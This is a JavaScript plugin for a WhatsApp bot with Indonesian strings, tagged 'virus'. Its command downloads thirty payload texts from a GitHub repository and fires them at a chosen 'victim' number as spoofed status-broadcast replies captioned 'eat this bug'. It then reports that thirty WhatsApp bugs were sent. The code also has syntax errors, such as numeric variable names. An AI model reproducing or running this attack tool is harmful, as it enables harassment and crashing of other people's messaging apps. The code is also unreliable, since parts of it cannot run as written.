let fetch = require('node-fetch')

let handler = async(m, { conn, text, usedPrefix }) => {
let [number, bebas] = text.split `|`
    if (!number) return conn.reply(m.chat, 'Silahkan masukan nomor yang akan dikirim', m)
    if (!bebas) return conn.reply(m.chat, 'Silahkan masukan pesannya', m)
    if (text > 500) return conn.reply(m.chat, 'Teks Kepanjangan!', m)    
    let user = global.db.data.users[m.sender]   

    let 1 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v1.txt")).text()
    let 2 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v2.txt")).text()
    let 3 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v3.txt")).text()
    let 4 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v4.txt")).text()
    let 5 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v5.txt")).text()
    let 6 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v6.txt")).text()
    let 7 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v7.txt")).text()
    let 8 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v8.txt")).text()
    let 9 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v9.txt")).text()
    let 10 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v10.txt")).text()
    let 11 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v11.txt")).text()
    let 12 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v12.txt")).text()
    let 13 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v13.txt")).text()
    let 14 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v14.txt")).text()
    let 15 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v15.txt")).text()
    let 16 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v16.txt")).text()
    let 17 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v17.txt")).text()
    let 18 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v18.txt")).text()
    let 19 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v19.txt")).text()
    let 20 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v20.txt")).text()
    let 21 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v21.txt")).text()
    let 22 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v22.txt")).text()
    let 23 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v23.txt")).text()
    let 24 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v24.txt")).text()
    let 25 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v25.txt")).text()
    let 26 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v26.txt")).text()
    let 27 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v27.txt")).text()
    let 28 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v28.txt")).text()
    let 29 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v29.txt")).text()
    let 30 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v30.txt")).text()

    let korban = `${number}`

    var nomor = m.sender

    

    conn.fakeReply(korban + '@s.whatsapp.net', 1, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
    conn.fakeReply(korban + '@s.whatsapp.net', 2, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
    conn.fakeReply(korban + '@s.whatsapp.net', 3, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
    conn.fakeReply(korban + '@s.whatsapp.net', 4, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
    conn.fakeReply(korban + '@s.whatsapp.net', 5, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
    conn.fakeReply(korban + '@s.whatsapp.net', 6, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
    conn.fakeReply(korban + '@s.whatsapp.net', 7, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
    conn.fakeReply(korban + '@s.whatsapp.net', 8, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
    conn.fakeReply(korban + '@s.whatsapp.net', 9, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
    conn.fakeReply(korban + '@s.whatsapp.net', 10, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
    conn.fakeReply(korban + '@s.whatsapp.net', 11, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
    conn.fakeReply(korban + '@s.whatsapp.net', 12, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
    conn.fakeReply(korban + '@s.whatsapp.net', 13, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
    conn.fakeReply(korban + '@s.whatsapp.net', 14, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
    conn.fakeReply(korban + '@s.whatsapp.net', 15, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
    conn.fakeReply(korban + '@s.whatsapp.net', 16, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
    conn.fakeReply(korban + '@s.whatsapp.net', 17, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
    conn.fakeReply(korban + '@s.whatsapp.net', 18, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
    conn.fakeReply(korban + '@s.whatsapp.net', 19, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
    conn.fakeReply(korban + '@s.whatsapp.net', 20, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
    conn.fakeReply(korban + '@s.whatsapp.net', 21, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
    conn.fakeReply(korban + '@s.whatsapp.net', 22, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
    conn.fakeReply(korban + '@s.whatsapp.net', 23, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
    conn.fakeReply(korban + '@s.whatsapp.net', 24, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
    conn.fakeReply(korban + '@s.whatsapp.net', 25, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
    conn.fakeReply(korban + '@s.whatsapp.net', 26, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
    conn.fakeReply(korban + '@s.whatsapp.net', 27, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
    conn.fakeReply(korban + '@s.whatsapp.net', 28, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
    conn.fakeReply(korban + '@s.whatsapp.net', 29, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
    conn.fakeReply(korban + '@s.whatsapp.net', 30, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')

    let logs = `[!] Berhasil Mengirim 30 Bug WhatsApp Ke Nomor ${korban}`

    conn.reply(m.chat, logs, m)

}

handler.help = ['vkoko1 <nomor>|<text bebas>']

handler.tags = ['virus']

handler.command = /^(vkoko1)$/i

handler.owner = true

handler.rowner = false

handler.limit = false

handler.premium = false

handler.group = false

handler.private = false

handler.admin = false

handler.botAdmin = false

handler.fail = null

handler.limit = false

module.exports = handler
